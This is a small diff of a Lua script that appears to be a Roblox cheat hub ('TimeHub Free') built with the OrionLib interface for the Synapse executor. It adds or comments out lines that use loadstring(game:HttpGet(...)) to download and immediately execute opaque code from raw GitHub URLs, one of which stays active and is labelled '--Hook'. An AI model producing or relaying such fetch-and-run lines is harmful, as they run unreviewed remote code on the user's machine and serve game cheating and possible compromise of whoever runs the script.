@@ -3,8 +3,8 @@ local Window = OrionLib:MakeWindow({Name = "TimeHub Free / Version 2.2.1", Icon 
 -- Delete if this will be not works on synapse
 wait(1)
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/Xd'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/xdddd'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/Xd'))() --Hook
+--loadstring(game:HttpGet('https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/xdddd'))() Controll
 --Here is end
 
 --Test controll
